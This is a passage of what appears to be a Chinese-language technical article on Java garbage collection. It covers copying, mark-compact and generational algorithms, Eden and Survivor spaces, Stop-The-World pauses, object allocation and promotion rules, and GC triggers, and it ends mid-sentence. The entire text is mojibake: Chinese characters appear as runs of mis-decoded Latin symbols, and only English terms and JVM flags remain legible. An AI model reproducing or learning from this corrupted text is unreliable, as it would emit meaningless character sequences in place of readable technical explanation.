å°†ç°æœ‰çš„å†…å­˜ç©ºé—´åˆ†ä¸ºä¸¤å¿«ï¼Œæ¯æ¬¡åªä½¿ç”¨å…¶ä¸­ä¸€å—ï¼Œåœ¨åƒåœ¾æ”¶é›†æ—¶å°†æ­£åœ¨ä½¿ç”¨çš„å†…å­˜ä¸­çš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°æœªè¢«ä½¿ç”¨çš„å†…å­˜å—ä¸­ï¼Œä¹‹åæ¸…é™¤æ­£åœ¨ä½¿ç”¨çš„å†…å­˜å—ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼Œäº¤æ¢ä¸¤ä¸ªå†…å­˜çš„è§’è‰²ï¼Œå®Œæˆåƒåœ¾æ”¶é›†ã€‚å¦‚æœç³»ç»Ÿä¸­çš„åƒåœ¾å¯¹è±¡å¾ˆå¤šï¼Œå¤åˆ¶ç®—æ³•éœ€è¦å¤åˆ¶çš„å­˜æ´»å¯¹è±¡æ•°é‡å¹¶ä¸ä¼šå¤ªå¤§ã€‚å› æ­¤åœ¨çœŸæ­£éœ€è¦åƒåœ¾æ”¶é›†çš„æ—¶åˆ»ï¼Œå¤åˆ¶ç®—æ³•çš„æ•ˆç‡æ˜¯å¾ˆé«˜çš„ã€‚åˆç”±äºå¯¹è±¡åœ¨åƒåœ¾æ”¶é›†è¿‡ç¨‹ä¸­ç»Ÿä¸€è¢«å¤åˆ¶åˆ°æ–°çš„å†…å­˜ç©ºé—´ä¸­ï¼Œå› æ­¤ï¼Œå¯ç¡®ä¿å›æ”¶åçš„å†…å­˜ç©ºé—´æ˜¯æ²¡æœ‰ç¢ç‰‡çš„ã€‚å¤åˆ¶ç®—æ³•çš„é«˜æ•ˆæ€§æ˜¯å»ºç«‹åœ¨å­˜æ´»å¯¹è±¡å°‘ã€åƒåœ¾å¯¹è±¡å¤šçš„å‰æä¸‹çš„ã€‚è¿™ç§æƒ…å†µåœ¨æ–°ç”Ÿä»£ç»å¸¸å‘ç”Ÿï¼Œä½†æ˜¯åœ¨è€å¹´ä»£æ›´å¸¸è§çš„æƒ…å†µæ˜¯å¤§éƒ¨åˆ†å¯¹è±¡éƒ½æ˜¯å­˜æ´»å¯¹è±¡ã€‚å¦‚æœä¾ç„¶ä½¿ç”¨å¤åˆ¶ç®—æ³•ï¼Œç”±äºå­˜æ´»çš„å¯¹è±¡è¾ƒå¤šï¼Œå¤åˆ¶çš„æˆæœ¬ä¹Ÿå°†å¾ˆé«˜ã€‚è¯¥ç®—æ³•çš„ç¼ºç‚¹æ˜¯å°†ç³»ç»Ÿå†…å­˜æŠ˜åŠã€‚ Java è™šæ‹Ÿæœºçš„æ–°ç”Ÿä»£ä¸²è¡Œåƒåœ¾æ”¶é›†å™¨ä¸­ä½¿ç”¨äº†å¤åˆ¶ç®—æ³•çš„æ€æƒ³ã€‚æ–°ç”Ÿä»£åˆ†ä¸º Eden ç©ºé—´ã€From Survivor ç©ºé—´ã€To Survivor ç©ºé—´ã€‚å…¶ä¸­ From Survivor ç©ºé—´å’Œ To Survivor ç©ºé—´å¯ä»¥è§†ä¸ºç”¨äºå¤åˆ¶çš„ä¸¤å—å¤§å°ç›¸åŒã€åœ°ä½ç›¸ç­‰ï¼Œä¸”å¯è¿›è¡Œè§’è‰²äº’æ¢çš„ç©ºé—´å—ã€‚From Survivor å’Œ To Survivor ç©ºé—´ä¹Ÿç§°ä¸º Survivor ç©ºé—´ï¼Œå³å¹¸å­˜è€…ç©ºé—´ï¼Œç”¨äºå­˜æ”¾æœªè¢«å›æ”¶çš„å¯¹è±¡ã€‚åœ¨åƒåœ¾æ”¶é›†æ—¶ï¼ŒEden ç©ºé—´ä¸­çš„å­˜æ´»å¯¹è±¡ä¼šè¢«å¤åˆ¶åˆ°æœªä½¿ç”¨çš„ Survivor ç©ºé—´ä¸­ï¼ˆå‡è®¾æ˜¯ To Survivorï¼‰ï¼Œæ­£åœ¨ä½¿ç”¨çš„ Survivor ç©ºé—´ï¼ˆå‡è®¾æ˜¯ Fromï¼‰ ä¸­çš„å¹´è½»å¯¹è±¡ä¹Ÿä¼šè¢«å¤åˆ¶åˆ° To Survivor ç©ºé—´ä¸­ (å¤§å¯¹è±¡æˆ–è€…è€å¹´å¯¹è±¡ä¼šç›´æ¥è¿›å…¥è€å¹´ä»£ï¼Œå¦‚æœ To Survivor ç©ºé—´å·²æ»¡ï¼Œåˆ™å¯¹è±¡ä¹Ÿä¼šç›´æ¥è¿›å…¥è€å¹´ä»£)ã€‚æ­¤æ—¶ï¼ŒEden ç©ºé—´å’Œ From Survivor ç©ºé—´ä¸­çš„å‰©ä½™å¯¹è±¡å°±æ˜¯åƒåœ¾å¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥æ¸…ç©ºï¼ŒTo Survivor ç©ºé—´åˆ™å­˜æ”¾æ­¤æ¬¡å›æ”¶åçš„å­˜æ´»å¯¹è±¡ã€‚è¿™ç§æ”¹è¿›çš„å¤åˆ¶ç®—æ³•æ—¢ä¿è¯äº†ç©ºé—´çš„è¿ç»­æ€§ï¼Œåˆé¿å…äº†å¤§é‡çš„å†…å­˜ç©ºé—´æµªè´¹ã€‚ æ ‡è®° - æ•´ç†ç®—æ³•å¤åˆ¶æ”¶é›†ç®—æ³•åœ¨å¯¹è±¡å­˜æ´»ç‡è¾ƒé«˜æ—¶å°±è¦è¿›è¡Œè¾ƒå¤šçš„å¤åˆ¶æ“ä½œï¼Œæ•ˆç‡å°†ä¼šå˜ä½ã€‚å¦‚æœä¸æƒ³æµªè´¹ 50% çš„ç©ºé—´ï¼Œå°±éœ€è¦æœ‰é¢å¤–çš„ç©ºé—´è¿›è¡Œåˆ†é…æ‹…ä¿ï¼Œä»¥åº”å¯¹è¢«ä½¿ç”¨çš„å†…å­˜ä¸­æ‰€æœ‰å¯¹è±¡éƒ½ 100% å­˜æ´»çš„æç«¯æƒ…å†µï¼Œæ‰€ä»¥è€å¹´ä»£ä¸èƒ½ç›´æ¥é€‰ç”¨è¿™ç§ç®—æ³•ã€‚æ ‡è®°æ•´ç†ç®—æ³•ä¸­ï¼Œæ ‡è®°è¿‡ç¨‹ä»ç„¶ä¸ â€œæ ‡è®° - æ¸…é™¤â€ ç®—æ³•ä¸€æ ·ï¼Œä½†æ˜¯åç»­æ­¥éª¤ä¸æ˜¯ç›´æ¥å¯¹å¯å›æ”¶å¯¹è±¡è¿›è¡Œæ¸…ç†ï¼Œè€Œæ˜¯è®©æ‰€æœ‰å­˜æ´»çš„å¯¹è±¡éƒ½å‘ä¸€ç«¯ç§»åŠ¨ï¼Œç„¶åç›´æ¥æ¸…ç†æ‰ç«¯è¾¹ç•Œä»¥å¤–çš„å†…å­˜ã€‚ åˆ†ä»£æ”¶é›†ç®—æ³•å¯¹äºä¸€ä¸ªå¤§å‹çš„ç³»ç»Ÿï¼Œå½“åˆ›å»ºçš„å¯¹è±¡å’Œæ–¹æ³•å˜é‡æ¯”è¾ƒå¤šæ—¶ï¼Œå †å†…å­˜ä¸­çš„å¯¹è±¡ä¹Ÿä¼šæ¯”è¾ƒå¤šï¼Œå¦‚æœé€ä¸€åˆ†æå¯¹è±¡æ˜¯å¦è¯¥å›æ”¶ï¼Œé‚£ä¹ˆåŠ¿å¿…é€ æˆæ•ˆç‡ä½ä¸‹ã€‚åˆ†ä»£æ”¶é›†ç®—æ³•æ˜¯åŸºäºè¿™æ ·ä¸€ä¸ªäº‹å®ï¼šä¸åŒçš„å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼ˆå­˜æ´»æƒ…å†µï¼‰æ˜¯ä¸ä¸€æ ·çš„ï¼Œè€Œä¸åŒç”Ÿå‘½å‘¨æœŸçš„å¯¹è±¡ä½äºå †å†…å­˜ä¸­ä¸åŒçš„åŒºåŸŸï¼Œå› æ­¤å¯¹å †å†…å­˜ä¸åŒåŒºåŸŸé‡‡ç”¨ä¸åŒçš„ç­–ç•¥è¿›è¡Œå›æ”¶å¯ä»¥æé«˜ JVM çš„æ‰§è¡Œæ•ˆç‡ã€‚â€œåˆ†ä»£æ”¶é›†â€ï¼ˆGenerational Collectionï¼‰ç®—æ³•ï¼Œæ ¹æ®å¯¹è±¡å­˜æ´»å‘¨æœŸçš„ä¸åŒå°†å†…å­˜åˆ’åˆ†ä¸ºå‡ å—ã€‚ä¸€èˆ¬æ˜¯æŠŠ Java å †åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€å¹´ä»£ï¼Œè¿™æ ·æ—¢å¯ä»¥æ ¹æ®å„ä¸ªå¹´ä»£çš„ç‰¹ç‚¹é‡‡ç”¨æœ€é€‚å½“çš„æ”¶é›†ç®—æ³•ã€‚åœ¨æ–°ç”Ÿä»£ä¸­ï¼Œæ¯æ¬¡åƒåœ¾æ”¶é›†æ—¶éƒ½å‘ç°æœ‰å¤§æ‰¹å¯¹è±¡æ­»å»ï¼Œåªæœ‰å°‘é‡å­˜æ´»ï¼Œé‚£å°±é€‰ç”¨å¤åˆ¶ç®—æ³•ï¼Œåªéœ€è¦ä»˜å‡ºå°‘é‡å¯¹è±¡çš„å¤åˆ¶æˆæœ¬å°±å¯ä»¥å®Œæˆæ”¶é›†ã€‚è€Œè€å¹´ä»£ä¸­å› ä¸ºå¯¹è±¡å­˜æ´»ç‡é«˜ã€æ²¡æœ‰é¢å¤–ç©ºé—´å¯¹å®ƒè¿›è¡Œåˆ†é…æ‹…ä¿ï¼Œå°±å¿…é¡»ä½¿ç”¨ â€œæ ‡è®° - æ¸…é™¤â€ æˆ–è€… â€œæ ‡è®° - æ•´ç†â€ ç®—æ³•æ¥è¿›è¡Œå›æ”¶ã€‚ GC ç®—æ³•å¯¹æ¯”å¤åˆ¶ç®—æ³•ï¼š å¤åˆ¶ç®—æ³•æ‰§è¡Œçš„é€Ÿåº¦è¾ƒå¿«ï¼Œå…¸å‹çš„ç©ºé—´æ¢æ—¶é—´ å½“å¯¹è±¡çš„å­˜æ´»ç‡å¾ˆé«˜çš„æ—¶å€™ï¼Œä¸æ–­çš„å¤åˆ¶æ“ä½œä¼šæ˜¾å¾—è€—æ—¶ å¤åˆ¶ç®—æ³•å¾ˆæ˜æ˜¾çš„ç¼ºç‚¹å°±æ˜¯æµªè´¹å†…å­˜ç©ºé—´ï¼Œå› ä¸ºå°†å†…å­˜åˆ†ä¸ºä¸¤å—ï¼Œä¸€æ¬¡åªèƒ½ä½¿ç”¨ä¸€å—ï¼Œè¿™ä¹Ÿæ„å‘³ç€åˆ†çš„å—è¶Šå¤§ï¼Œæµªè´¹çš„å†…å­˜è¶Šå¤š æ ‡è®° - æ¸…é™¤ç®—æ³•ï¼š é¦–å…ˆæ˜¯é€Ÿåº¦æ…¢ï¼Œå› ä¸ºâ€ æ ‡è®° - æ¸…é™¤ç®—æ³•â€ åœ¨æ ‡è®°é˜¶æ®µéœ€è¦ä½¿ç”¨é€’å½’çš„æ–¹å¼ä»æ ¹ç»“ç‚¹å‡ºå‘ï¼Œä¸æ–­å¯»æ‰¾å¯è¾¾çš„å¯¹è±¡ï¼›è€Œåœ¨æ¸…é™¤é˜¶æ®µåˆéœ€è¦éå†å †å†…å­˜ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼ŒæŸ¥çœ‹å…¶æ˜¯å¦è¢«æ ‡è®°ï¼Œç„¶åå†æ¸…é™¤ï¼›å¹¶ä¸”åœ¨ç¨‹åºè¿›è¡Œ GC çš„æ—¶å€™ï¼ŒJVM ä¸­æ‰€æœ‰çš„ Java ç¨‹åºéƒ½è¦è¿›è¡Œæš‚åœï¼Œä¿—ç§° Stop-The-Worldï¼Œåé¢ä¼šæåˆ°ã€‚ å…¶æ¬¡æ˜¯å…¶æœ€å¤§çš„ç¼ºç‚¹ï¼Œä½¿ç”¨è¿™ç§ç®—æ³•è¿›è¡Œæ¸…ç†è€Œå¾—çš„å †å†…å­˜çš„ç©ºé—²ç©ºé—´ä¸€èˆ¬æ˜¯ä¸è¿ç»­çš„ï¼Œç”±äºå¯¹è±¡å®ä¾‹åœ¨å †å†…å­˜ä¸­æ˜¯éšæœºå­˜å‚¨çš„ï¼Œæ‰€ä»¥åœ¨æ¸…ç†ä¹‹åï¼Œä¼šäº§ç”Ÿè®¸å¤šçš„å†…å­˜ç¢ç‰‡ï¼Œå¦‚æœè¿™ä¸ªæ—¶å€™æ¥äº†ä¸€ä¸ªå¾ˆå¤§çš„å¯¹è±¡å®ä¾‹ï¼Œå°½ç®¡æ˜¾ç¤ºå†…å­˜è¿˜è¶³å¤Ÿï¼Œä½†æ˜¯å·²ç»å­˜ä¸ä¸‹è¿™ä¸ªå¤§å¯¹è±¡äº†ï¼Œå†…å­˜ç¢ç‰‡å¤ªå¤šä¼šå¯¼è‡´å½“ç¨‹åºéœ€è¦ä¸ºè¾ƒå¤§å¯¹è±¡åˆ†é…å†…å­˜æ—¶æ— æ³•æ‰¾åˆ°è¶³å¤Ÿçš„è¿ç»­å†…å­˜è€Œä¸å¾—ä¸æå‰è§¦å‘å¦ä¸€æ¬¡åƒåœ¾æ”¶é›†åŠ¨ä½œã€‚å†è€…ï¼Œè¿™ç§é›¶æ•£çš„ç¢ç‰‡å¯¹äºæ•°ç»„çš„åˆ†é…ä¹Ÿä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚ æ ‡è®° - æ•´ç†ç®—æ³•ï¼š é¦–å…ˆè¿™ç§ç®—æ³•å…‹æœäº†â€ æ ‡è®° - æ¸…é™¤ç®—æ³•â€ ä¸­ä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡çš„ç¼ºç‚¹ï¼Œä¹Ÿè§£å†³äº†å¤åˆ¶ç®—æ³•ä¸­å†…å­˜å‡åŠä½¿ç”¨çš„ä¸è¶³ è€Œå…¶ç¼ºç‚¹åˆ™æ˜¯é€Ÿåº¦ä¹Ÿä¸æ˜¯å¾ˆå¿«ï¼Œä¸ä»…è¦éå†æ ‡è®°æ‰€æœ‰å¯è¾¾ç»“ç‚¹ï¼Œè¿˜è¦ä¸€ä¸ªä¸ªæ•´ç†å¯è¾¾å­˜æ´»å¯¹è±¡çš„åœ°å€ï¼Œæ‰€ä»¥å¯¼è‡´å…¶æ•ˆç‡ä¸æ˜¯å¾ˆé«˜ å…³äº Stop-The-Worldåœ¨ GC ç®—æ³•æ‰§è¡Œçš„æ—¶å€™ï¼Œæ‰€æœ‰æ­£åœ¨æ‰§è¡Œä¸­çš„ Java ç¨‹åºéƒ½ä¼šè¢«æŒ‚èµ·ï¼ˆè¢«æš‚åœï¼‰ï¼Œåªæœ‰ Native æ–¹æ³•å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯ä¹Ÿä¸èƒ½å’Œ JVM è¿›è¡Œäº¤äº’ï¼Œè¿™æ ·ä¸€æ¥ä¼¼ä¹æ•´ä¸ª Java ä¸–ç•Œéƒ½åœæ­¢äº†ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆå«åš Stop-The-Worldï¼›ç­‰åˆ° GC ç¨‹åºæ‰§è¡Œå®Œæ¯•åï¼ŒJava ç¨‹åºæ‰ä¼šé‡æ–°æ¢å¤æ‰§è¡Œã€‚è¿™ä¸ªå…¶å®å¾ˆå¥½ç†è§£ï¼Œå› ä¸º GC ç¨‹åºæ˜¯ä¸€ä¸ªçº¿ç¨‹ï¼ŒJava ç¨‹åºä¹Ÿæ˜¯ä¸€ä¸ªçº¿ç¨‹ï¼Œå®ƒä»¬æ“ä½œçš„å †å†…å­˜æ˜¯ä¸€ç‰‡å…±äº«çš„åŒºåŸŸï¼Œå‡è®¾ä¸€ç§æƒ…å†µï¼ŒJava ç¨‹åº A æ–°å»ºäº†ä¸€ä¸ªå¯¹è±¡ objectï¼Œnew Objectï¼ˆï¼‰è¢«å­˜æ”¾åœ¨å †å†…å­˜ï¼Œä½†æ˜¯å¾ˆä¸å·§çš„æ˜¯ï¼Œå †å†…å­˜åˆšåˆšæ‰§è¡Œè¿‡å¤åˆ¶ç®—æ³•ï¼Œå‰ä¸€æ­¥å­˜æ´»çš„å¯¹è±¡å·²ç»è¢«è½¬ç§»åˆ°å¦ä¸€å—ç©ºé—´äº†ï¼Œè€Œ new Objectï¼ˆï¼‰å°±ç•™åœ¨äº†åŸæ¥çš„ç©ºé—´ï¼Œæ— è¾œåœ°è¢«æ¸…é™¤äº†ã€‚è¿™æ˜¾ç„¶æ˜¯ä¸å¯æ¥å—çš„ï¼Œå› ä¸ºçº¿ç¨‹ä¸å®‰å…¨ã€‚ å†…å­˜åˆ†é…ç­–ç•¥Java çš„è‡ªåŠ¨å†…å­˜ç®¡ç†ï¼Œæœ€ç»ˆå¯ä»¥å½’ç»“ä¸ºè‡ªåŠ¨åŒ–åœ°è§£å†³äº†ä¸¤ä¸ªé—®é¢˜ï¼šç»™å¯¹è±¡åˆ†é…å†…å­˜ã€å›æ”¶åˆ†é…ç»™å¯¹è±¡çš„å†…å­˜ã€‚å¯¹è±¡çš„å†…å­˜åˆ†é…é€šå¸¸æ˜¯åœ¨å †ä¸Šåˆ†é…ï¼ˆé™¤æ­¤ä»¥å¤–è¿˜æœ‰å¯èƒ½ç»è¿‡ JIT ç¼–è¯‘åè¢«æ‹†æ•£ä¸ºæ ‡é‡ç±»å‹å¹¶é—´æ¥åœ°åœ¨æ ˆä¸Šåˆ†é…ï¼‰ï¼Œå¯¹è±¡ä¸»è¦åˆ†é…åœ¨æ–°ç”Ÿä»£çš„ Eden ç©ºé—´ä¸Šï¼Œå¦‚æœå¯åŠ¨äº†æœ¬åœ°çº¿ç¨‹åˆ†é…ç¼“å†²ï¼Œå°†æŒ‰çº¿ç¨‹ä¼˜å…ˆåœ¨ TLAB ä¸Šåˆ†é…ã€‚å°‘æ•°æƒ…å†µä¸‹ä¹Ÿå¯èƒ½ä¼šç›´æ¥åˆ†é…åœ¨è€å¹´ä»£ä¸­ï¼Œåˆ†é…çš„è§„åˆ™å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œå®é™…å–å†³äºåƒåœ¾æ”¶é›†å™¨çš„å…·ä½“ç»„åˆä»¥åŠè™šæ‹Ÿæœºä¸­ä¸å†…å­˜ç›¸å…³çš„å‚æ•°çš„è®¾ç½®ã€‚ä¸‹é¢ä»¥ä½¿ç”¨ Serial/Serial Old æ”¶é›†å™¨ï¼Œä»‹ç»å†…å­˜åˆ†é…çš„ç­–ç•¥ã€‚ å¯¹è±¡ä¼˜å…ˆåœ¨ Eden ç©ºé—´åˆ†é…å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¯¹è±¡åœ¨æ–°ç”Ÿä»£çš„ Eden ç©ºé—´ä¸­åˆ†é…ï¼Œå½“ Eden ç©ºé—´æ²¡æœ‰è¶³å¤Ÿç©ºé—´è¿›è¡Œåˆ†é…æ—¶ï¼Œè™šæ‹Ÿæœºå°†å‘èµ·ä¸€æ¬¡ Minor GCã€‚ å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£æ‰€è°“çš„å¤§å¯¹è±¡æ˜¯æŒ‡éœ€è¦å¤§é‡è¿ç»­å†…å­˜ç©ºé—´çš„ Java å¯¹è±¡ï¼Œæœ€å…¸å‹çš„å¤§å¯¹è±¡å°±æ˜¯å¾ˆé•¿çš„å­—ç¬¦ä¸²ä»¥åŠæ•°ç»„ã€‚å¤§å¯¹è±¡å¯¹è™šæ‹Ÿæœºçš„å†…å­˜åˆ†é…æ¥è¯´æ˜¯ä¸€ä¸ªåæ¶ˆæ¯ï¼ˆå°¤å…¶æ˜¯é‡åˆ°æœç”Ÿå¤•ç­çš„ â€œçŸ­å‘½å¤§å¯¹è±¡â€ï¼Œå†™ç¨‹åºæ—¶åº”é¿å…ï¼‰ï¼Œç»å¸¸å‡ºç°å¤§å¯¹è±¡å®¹æ˜“å¯¼è‡´å†…å­˜è¿˜æœ‰ä¸å°‘ç©ºé—´æ—¶ï¼Œå°±æå‰è§¦å‘ GC ä»¥è·å–è¶³å¤Ÿçš„è¿ç»­å†…å­˜ç©ºé—´æ¥å®‰ç½®å®ƒä»¬ã€‚è™šæ‹Ÿæœºæä¾›äº†ä¸€ä¸ª -XX:PretenureSizeThreshold å‚æ•°ï¼Œä»¤å¤§å°è¶…è¿‡è¿™ä¸ªè®¾ç½®å€¼çš„å¯¹è±¡ç›´æ¥åœ¨è€å¹´ä»£åˆ†é…ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯é¿å…åœ¨ Eden ç©ºé—´åŠä¸¤ä¸ª Survivor ç©ºé—´ä¹‹é—´å‘ç”Ÿå¤§é‡çš„å†…å­˜å¤åˆ¶ï¼ˆæ–°ç”Ÿä»£é‡‡ç”¨å¤åˆ¶ç®—æ³•æ¥å›æ”¶å†…å­˜ï¼‰ã€‚ é•¿æœŸå­˜æ´»çš„å¯¹è±¡å°†è¿›å…¥è€å¹´ä»£æ—¢ç„¶è™šæ‹Ÿæœºé‡‡ç”¨äº†åˆ†ä»£æ”¶é›†çš„æ€æƒ³æ¥ç®¡ç†å†…å­˜ï¼Œé‚£ä¹ˆå†…å­˜å›æ”¶æ—¶å°±å¿…é¡»èƒ½è¯†åˆ«å“ªäº›å¯¹è±¡åº”æ”¾åœ¨æ–°ç”Ÿä»£ï¼Œå“ªäº›å¯¹è±¡åº”æ”¾åœ¨è€å¹´ä»£ä¸­ã€‚ä¸ºäº†åšåˆ°è¿™ç‚¹ï¼Œè™šæ‹Ÿæœºç»™æ¯ä¸ªå¯¹è±¡å®šä¹‰äº†ä¸€ä¸ªå¯¹è±¡å¹´é¾„ï¼ˆAgeï¼‰è®¡æ•°å™¨ã€‚å¦‚æœå¯¹è±¡åœ¨ Eden ç©ºé—´å‡ºç”Ÿå¹¶ç»è¿‡ç¬¬ä¸€æ¬¡ Minor GC åä»ç„¶å­˜æ´»ï¼Œå¹¶ä¸”èƒ½è¢« Survivor ç©ºé—´å®¹çº³çš„è¯ï¼Œå°†è¢«ç§»åŠ¨åˆ° Survivor ç©ºé—´ä¸­ï¼Œå¹¶ä¸”å¯¹è±¡å¹´é¾„è®¾ä¸º 1ã€‚å¯¹è±¡åœ¨ Survivor ç©ºé—´ä¸­æ¯ â€œç†¬è¿‡â€ ä¸€æ¬¡ Minor GCï¼Œå¹´é¾„å°±å¢åŠ  1 å²ï¼Œå½“å®ƒçš„å¹´é¾„å¢åŠ åˆ°ä¸€å®šç¨‹åº¦ï¼ˆé»˜è®¤ä¸º 15 å²ï¼‰ï¼Œå°±å°†ä¼šè¢«æ™‹å‡åˆ°è€å¹´ä»£ä¸­ã€‚å¯¹è±¡æ™‹å‡è€å¹´ä»£çš„å¹´é¾„é˜ˆå€¼ï¼Œå¯ä»¥é€šè¿‡å‚æ•° -XX:MaxTenuringThreshold è®¾ç½®ã€‚ åŠ¨æ€å¯¹è±¡å¹´é¾„åˆ¤å®šä¸ºäº†èƒ½æ›´å¥½åœ°é€‚åº”ä¸åŒç¨‹åºçš„å†…å­˜çŠ¶å†µï¼Œè™šæ‹Ÿæœºå¹¶ä¸æ˜¯æ°¸è¿œåœ°è¦æ±‚å¯¹è±¡çš„å¹´é¾„å¿…é¡»è¾¾åˆ°äº† MaxTenuringThreshold æ‰èƒ½æ™‹å‡è€å¹´ä»£ï¼Œå¦‚æœåœ¨ Survivor ç©ºé—´ä¸­ç›¸åŒå¹´é¾„æ‰€æœ‰å¯¹è±¡å¤§å°çš„æ€»å’Œå¤§äº Survivor ç©ºé—´çš„ä¸€åŠï¼Œå¹´é¾„å¤§äºæˆ–ç­‰äºè¯¥å¹´é¾„çš„å¯¹è±¡å°±å¯ä»¥ç›´æ¥è¿›å…¥è€å¹´ä»£ï¼Œæ— é¡»ç­‰åˆ° MaxTenuringThreshold ä¸­è¦æ±‚çš„å¹´é¾„ã€‚ ç©ºé—´åˆ†é…æ‹…ä¿åœ¨å‘ç”Ÿ Minor GC ä¹‹å‰ï¼Œè™šæ‹Ÿæœºä¼šå…ˆæ£€æŸ¥è€å¹´ä»£æœ€å¤§å¯ç”¨çš„è¿ç»­å†…å­˜ç©ºé—´æ˜¯å¦å¤§äºæ–°ç”Ÿä»£æ‰€æœ‰å¯¹è±¡æ€»ç©ºé—´ï¼Œå¦‚æœè¿™ä¸ªæ¡ä»¶æˆç«‹ï¼Œé‚£ä¹ˆ Minor GC å¯ä»¥ç¡®ä¿æ˜¯å®‰å…¨çš„ã€‚å¦‚æœä¸æˆç«‹ï¼Œåˆ™è™šæ‹Ÿæœºä¼šæŸ¥çœ‹ HandlePromotionFailure çš„è®¾ç½®å€¼æ˜¯å¦å…è®¸æ‹…ä¿å¤±è´¥ã€‚å¦‚æœå…è®¸ï¼Œé‚£ä¹ˆä¼šç»§ç»­æ£€æŸ¥è€å¹´ä»£æœ€å¤§å¯ç”¨çš„è¿ç»­å†…å­˜ç©ºé—´æ˜¯å¦å¤§äºå†æ¬¡æ™‹å‡åˆ°è€å¹´ä»£å¯¹è±¡çš„å¹³å‡å¤§å°ï¼›å¦‚æœå¤§äºï¼Œå°†å°è¯•ç€è¿›è¡Œä¸€æ¬¡ Minor GCï¼Œå°½ç®¡è¿™æ¬¡ Minor GC æ˜¯æœ‰é£é™©çš„ï¼›å¦‚æœå°äºæˆ–è€… HandlePromotionFailure çš„è®¾ç½®ä¸å…è®¸å†’é™©ï¼Œé‚£è¿™æ—¶ä¹Ÿè¦æ”¹ä¸ºè¿›è¡Œä¸€æ¬¡ Full GCã€‚æ–°ç”Ÿä»£ä½¿ç”¨å¤åˆ¶ç®—æ³•ï¼Œä½†ä¸ºäº†å†…å­˜åˆ©ç”¨ç‡ï¼Œåªä½¿ç”¨å…¶ä¸­ä¸€ä¸ª Survivor ç©ºé—´æ¥ä½œä¸ºè½®æ¢å¤‡ä»½ï¼Œå› æ­¤å½“å‡ºç°å¤§é‡å¯¹è±¡åœ¨ Minor GC åä»ç„¶å­˜æ´»çš„æƒ…å†µï¼ˆæœ€æç«¯çš„æƒ…å†µå°±æ˜¯å†…å­˜å›æ”¶åæ–°ç”Ÿä»£ä¸­æ‰€æœ‰å¯¹è±¡éƒ½å­˜æ´»ï¼‰ï¼Œå°±éœ€è¦è€å¹´ä»£è¿›è¡Œåˆ†é…æ‹…ä¿ï¼ŒæŠŠ Survivor æ— æ³•å®¹çº³çš„å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£ã€‚ä¸ç”Ÿæ´»ä¸­çš„è´·æ¬¾æ‹…ä¿ç±»ä¼¼ï¼Œè€å¹´ä»£è¦è¿›è¡Œè¿™æ ·çš„æ‹…ä¿ï¼Œå‰ææ˜¯è€å¹´ä»£æœ¬èº«è¿˜æœ‰å®¹çº³è¿™äº›å¯¹è±¡çš„å‰©ä½™ç©ºé—´ï¼Œä¸€å…±æœ‰å¤šå°‘å¯¹è±¡ä¼šæ´»ä¸‹æ¥åœ¨å®é™…å®Œæˆå†…å­˜å›æ”¶ä¹‹å‰æ˜¯æ— æ³•æ˜ç¡®çŸ¥é“çš„ï¼Œæ‰€ä»¥åªå¥½å–ä¹‹å‰æ¯ä¸€æ¬¡å›æ”¶æ™‹å‡åˆ°è€å¹´ä»£å¯¹è±¡å®¹é‡çš„å¹³å‡å¤§å°å€¼ä½œä¸ºç»éªŒå€¼ï¼Œä¸è€å¹´ä»£çš„å‰©ä½™ç©ºé—´è¿›è¡Œæ¯”è¾ƒï¼Œå†³å®šæ˜¯å¦è¿›è¡Œ Full GC æ¥è®©è€å¹´ä»£è…¾å‡ºæ›´å¤šç©ºé—´ã€‚ä½¿ç”¨å¹³å‡å€¼è¿›è¡Œæ¯”è¾ƒå…¶å®ä»ç„¶æ˜¯ä¸€ç§åŠ¨æ€æ¦‚ç‡çš„æ‰‹æ®µï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæŸæ¬¡ Minor GC å­˜æ´»åçš„å¯¹è±¡çªå¢ï¼Œè¿œè¿œé«˜äºå¹³å‡å€¼çš„è¯ï¼Œä¾ç„¶ä¼šå¯¼è‡´æ‹…ä¿å¤±è´¥ï¼ˆHandle Promotion Failureï¼‰ã€‚å¦‚æœå‡ºç°äº† HandlePromotionFailure å¤±è´¥ï¼Œé‚£å°±åªå¥½åœ¨å¤±è´¥åé‡æ–°å‘èµ·ä¸€æ¬¡ Full GCã€‚è™½ç„¶æ‹…ä¿å¤±è´¥æ—¶ç»•çš„åœˆå­æ˜¯æœ€å¤§çš„ï¼Œä½†å¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½è¿˜æ˜¯ä¼šå°† HandlePromotionFailure å¼€å…³æ‰“å¼€ï¼Œé¿å… Full GC è¿‡äºé¢‘ç¹ã€‚ GC çš„è§¦å‘æ¡ä»¶Minor GC çš„è§¦å‘æ¡ä»¶å¯¹äº Minor GCï¼Œå…¶è§¦å‘æ¡ä»¶éå¸¸ç®€å•ï¼Œå½“æ–°ç”Ÿä»£çš„ Eden ç©ºé—´æ»¡æ—¶ï¼Œå°±å°†è§¦å‘ä¸€æ¬¡ Minor GCã€‚ Full GC çš„è§¦å‘æ¡ä»¶è°ƒç”¨ System.gc ()æ­¤æ–¹æ³•çš„è°ƒç”¨æ˜¯å»ºè®® JVM è¿›è¡Œ Full GCï¼Œè™½ç„¶åªæ˜¯å»ºè®®è€Œéä¸€å®šï¼Œä½†å¾ˆå¤šæƒ…å†µä¸‹å®ƒä¼šè§¦å‘ Full GCï¼Œä»è€Œå¢åŠ  Full GC çš„é¢‘ç‡ï¼Œä¹Ÿå³å¢åŠ äº†é—´æ­‡æ€§åœé¡¿çš„æ¬¡æ•°ã€‚å› 